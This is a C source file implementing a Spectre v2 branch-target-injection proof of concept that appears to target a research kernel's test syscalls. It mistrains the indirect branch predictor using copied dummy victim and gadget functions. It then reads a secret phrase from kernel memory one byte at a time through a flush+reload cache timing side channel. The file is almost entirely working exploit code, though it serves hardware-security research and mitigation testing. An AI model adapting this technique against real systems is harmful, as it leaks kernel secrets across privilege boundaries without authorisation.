/*
  Reads kernel memory using spectre v2. This code works with kernel/sysattack.cc

  General approach:
  - The functions dummy_victim and dummy_gadget are memcpy'd to the same addresses
    (minus the top kernel bit of the virtual address) as sys_spectre_victim and
    gadget, which are defined in sysattack.cc, respectively.
  - Dummy_victim contains an indirect call that is approximately at the same address
    as the indirect call in sys_spectre_victim. Dummy_victim is repeatedly called
    such that the indirect call jumps to dummy_gadget.
  - When sys_spectre_victim is called, the target of the indirect call will
    be mispredicted to gadget, which reads kernel memory into the side channel.
 */

#pragma clang optimize off

#include <stdio.h>
#include <sys/mman.h>
#include <cstring>
#include <stdlib.h>

#include "sysstubs.h"

#define PRINT_DEBUG true

#define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
#define PAGE_BITS 12
#define PAGE_SIZE (1ull << PAGE_BITS)
#define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)

#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

static inline void clflush(volatile void *p)
{
  __asm volatile("clflush (%0)" :: "r" (p));
}

static inline void mfence()
{
  __asm volatile("mfence");
}

static inline uint64_t
rdtsc(void)
{
  uint32_t hi, lo;
  __asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)lo)|(((uint64_t)hi)<<32);
}

// mimic the safe target
__attribute__((noinline))
int
dummy_gadget2(void)
{
  return 4;
}

// mimic the safe target
__attribute__((noinline))
int
dummy_gadget(void)
{
  return 3;
}



// mimic the victim
__attribute__((noinline))
int
dummy_victim(volatile u8 *channel, volatile u64 dest, volatile int input)
{
  int result;
  __asm volatile("   mov %1, %%r11\n"
                 "   mov $0, %%rdx\n"
                 "1: cmp $0x64, %%rdx\n"
                 "   jle 2f\n"
                 "   jmp 4f\n"
                 "2: jmp 3f\n"
                 "3: add $0x1, %%rdx\n"
                 "dummy_victim_branch_addr:\n"
                 "4: .byte 0x2e, 0x2e, 0x41, 0xff, 0xd3\n" // "cs cs callq *%r11"
                 "   movl %%eax, %0\n"
                 : "=r" (result) : "r" (dest): "rdx", "r11");
  return result;
  // // set up bhb by performing >29 taken branches
  // int result;
  // __asm volatile("dummy_victim_start: push %%rdx\n"
  //                "mov $100, %%rdx\n"
  //                "1: dec %%rdx\n"
  //                "jnz 1b\n"
  //                "pop %%rdx\n"
  //                "movq %1, %%r11\n"
  //                "call *%%r11\n"
  //                "movl %%eax, %0\n"
  //                : "=r" (result) : "r" (dest) : "r11");
  // return result;
}

void*
mmap_two_pages(u64 addr)
{
  return mmap((void*) (addr & PAGE_INDEX_MASK),
              PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
              PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS,
              0, 0);
}

int (*uv)(u8*, u64, int); // memcpy'd dummy_victim
u64 uga; // address of memcpy'd dummy_gadget

// see appendix C of https://spectreattack.com/spectre.pdf
int
readByte(char *addrToRead, char result[2])
{
  u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;

  unsigned long times[256];

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 9999; tries > 0; tries--) {
    // poison branch predictor
    for (j = 10000; j > 0; j--) {
      junk ^= uv(channel, uga, 0);
    }
    mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);
    mfence();

    // flush actual target
    ward_spectre_flush_target();
    mfence();

    // call victim
    junk ^= ward_spectre_victim(channel, (u8*)addrToRead, 0);
    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
      times[i] = elapsed;
    }
    for (i = 0; i < 256; i++)
      if (hits[i] > 20)
        tries = 0;
  }

  // for (int i = 0; i < 256; i++) {
  //   printf("%lu ", times[i]);
  //   if (i%16 == 15) printf("\n");
  // }
  // printf("\n");

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    // if (PRINT_DEBUG && hits[i] > 0)
    //   printf("hit %d: %d\n", i, hits[i]);

    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }
  if ((hits[j] >= 2 * hits[k] + 2) ||
      (hits[j] >= 2 && hits[k] == 0)) {
    result[0] = (char)j;
    result[1] = 1;
  } else {
    result[0] = 0;
    result[1] = 0;
  }
  // printf("\n");

  free(channel);
  return junk; // prevent junk from being optimized out
}

int
main(int argc, char *argv[])
{
  extern char dummy_victim_branch_addr[];

  u64 kva = ward_spectre_get_victim_branch_addr(); // need to mistrain this call
  u64 kga = ward_spectre_get_gadget_addr(); // to predict here
  int uvoffset = (u8*)dummy_victim_branch_addr - (u8*)&dummy_victim;
  u64 uva = (kva & USER_MASK) - uvoffset;

  uv = ((int (*)(u8*, u64, int)) uva);
  uga = kga & USER_MASK;

  if (mmap_two_pages(uva) == MAP_FAILED) {
    printf("mmap uva failed\n");
    return 1;
  }
  if (mmap_two_pages(uga) == MAP_FAILED) {
    printf("mmap uga failed\n");
    return 1;
  }

  // size should be larger than function
  void* dest = memcpy((void*) uva, (void*) &dummy_victim, 256);
  if ((u64)dest != uva) {
    printf("memcpy uva failed\n");
    return 1;
  }

  // don't copy too much or else it will overwrite uva
  dest = memcpy((void*) uga, (void*) &dummy_gadget, 20);
  if ((u64)dest != uga) {
    printf("memcpy uga failed\n");
    return 1;
  }

  int secret_len;
  u64 secret_addr = ward_spectre_get_secret_addr(&secret_len);

  int junk = 0;
  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
  int index = 0;

  printf("Reading secret phrase: "); fflush(stdout);
  while (index < secret_len) {
    junk += readByte(((char*) secret_addr) + index, result);
    if (result[1] == 1) {
      printf("%c", result[0]);
    } else {
      printf("?");
    }
    fflush(stdout);
    index++;
  }

  printf("\n");
  fprintf(fopen("/dev/null", "w"), "%d", junk);
  return 0;
}
